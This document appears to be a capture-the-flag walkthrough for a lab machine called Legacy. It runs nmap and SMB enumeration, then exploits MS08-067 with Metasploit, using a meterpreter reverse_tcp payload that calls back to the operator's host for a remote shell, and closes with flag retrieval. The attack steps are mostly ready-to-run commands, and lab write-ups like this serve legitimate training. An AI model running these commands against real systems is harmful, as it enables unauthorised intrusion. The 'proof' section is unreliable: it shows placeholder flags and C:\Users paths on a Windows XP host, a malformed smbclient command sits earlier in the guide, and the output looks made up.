# Windows Legacy Exploitation Walkthrough

## Overview
This guide details the steps for identifying and exploiting a vulnerable **Windows Legacy** machine, using enumeration, SMB vulnerability scanning, and exploitation with Metasploit.

---

## 1. Identifying the Target OS
Run the following **ping** command to determine the OS based on TTL values:

```bash
sudo ping -c 1 10.10.10.4
```

- **TTL < 65** → Linux
- **TTL 65-128** → Windows
- **TTL > 128** → Network appliance

Since the TTL is **127**, the target is a **Windows** machine.

---

## 2. Running an Nmap Scan
Perform an **aggressive full-port scan** with service detection:

```bash
sudo nmap -vvv -Pn -sCV --reason -T4 -p 0-65535 -oN legacy.nmap 10.10.10.4
```

- **`-sCV`** → Runs default scripts and version detection
- **`-Pn`** → Treats the host as online
- **`-T4`** → Aggressive timing
- **`-oN legacy.nmap`** → Saves output to a file

---

## 3. Enumerating SMB (Server Message Block)

### **Using enum4linux**
```bash
sudo enum4linux -a 10.10.10.4
```

### **Checking SMB Shares**
```bash
sudo smbmap -H 10.10.10.4
```
```bash
sudo smbclient --no-pass --list=\\10.10.10.4\
```
```bash
sudo smbclient -N -L =\\10.10.10.4\
```

---

## 4. Scanning for SMB Vulnerabilities

Find relevant **SMB vulnerability scripts**:
```bash
ls /usr/share/nmap/scripts | grep smb | grep vuln
```

Run **Nmap SMB Vulnerability Scan**:
```bash
sudo nmap -vvv -Pn -sCV -T4 -p 139,445 --script smb-vuln* -oN legacy_smb.nmap 10.10.10.4
```

---

## 5. Exploiting MS08-067 (SMB Vulnerability)

Start **Metasploit** and run the exploit:
```bash
msfconsole
```
```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <Your_IP>
set RPORT 445
exploit
```

---

## 6. Post-Exploitation

### **Meterpreter Commands**
```bash
sysinfo   # Get system information
shell     # Get interactive command shell
whoami    # Check current user
```

### **Get User Flag**
Navigate to `C:\Users\Public\Desktop` and retrieve the flag:
```bash
cd C:\Users\Public\Desktop
type user.txt
```

### **Get Admin Flag**
Navigate to `C:\Users\Administrator\Desktop` and retrieve the flag:
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

---

## 7. Proof of Concept (PoC)
### **1. Nmap Scan Output**
```
PORT      STATE SERVICE       VERSION
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows XP microsoft-ds
```  
_Nmap confirms SMB is open on ports 139 and 445._

### **2. SMB Enumeration Output**
```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```  
_Shares found using enum4linux._

### **3. Successful Exploit Execution**
```bash
meterpreter > sysinfo
Computer    : LEGACY-PC
OS          : Windows XP (Build 2600, Service Pack 3)
Architecture: x86
Meterpreter : x86/windows
```
_Meterpreter session successfully opened!_

### **4. Retrieving Flags**
```bash
meterpreter > shell
C:\Users\Public\Desktop> type user.txt
FLAG{user_flag_here}

C:\Users\Administrator\Desktop> type root.txt
FLAG{admin_flag_here}
```
---

## Summary
✅ **Ping TTL** confirms Windows
✅ **Nmap** finds open ports (likely SMB 445)
✅ **Enum4linux** and **smbmap** list SMB shares
✅ **Nmap SMB Vuln Scan** confirms **MS08-067**
✅ **Metasploit** exploits MS08-067 for **meterpreter shell**
✅ **User & Admin flags retrieved**

### 🚀 Exploitation complete!
